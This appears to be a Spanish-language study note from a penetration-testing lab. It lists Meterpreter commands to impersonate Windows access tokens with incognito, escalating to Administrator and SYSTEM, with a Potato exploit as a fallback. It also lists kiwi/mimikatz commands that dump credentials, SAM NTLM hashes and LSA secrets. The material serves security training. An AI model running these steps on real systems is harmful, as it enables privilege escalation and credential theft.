forma de impersonar access tokens

estando en meterpreter, darle un getprivs para revisar si se tiene el privilegio de "SeImpersonatePrivilege", si esta se puede usar.

1.- en meterpreter, ```load incognito```
2.- ```list_tokens -u``` lista los tokens disponibles
*Nota: delegation tokens son creados por el login interactivo realizado*
     *impersonate tokens son creados por una no interactiva proceso de login*
3.- del listado anterior, seleccionamos el deseado (administrator de ser posible), y ejecutamos ```impersonate_token "ATTACKDEFENSE\Administrator"```

con esto realizado, ya estamos como usuario Administrator, y solo queda migrar a un proceso administrador para obtener todos los permisos

*Nota Final: en caso de no tener ninguna opcion listada en el paso 2, se puede ejecutar el exploit potato, el cual genera un token para luego poder impersonar (continuar los pasos siguientes)*
		*PROCESO PUEDE SER REPETIDO PARA IR CAMBIANDO DE USUARIO HASTA OBTENER EL NT AUTHORITY/SYSTEM*



----
*kiwi, una version de mimikatz integrada en meterpreter*

Opcion teniendo sesion de meterpreter y privilegios de NT AUTHORITY/SYSTEM
```
meterpreter > load kiwi
meterpreter > creds_all -> dumpeo de todas las credenciales
meterpreter > lsa_dump_sam -> dumpeo de credenciales NTLM del sistema. provee el SYSKEY y SAMKEY para desencriptar contraseñas
meterpreter > lsa_dump_secrets -> a veces da credenciales en texto claro

```
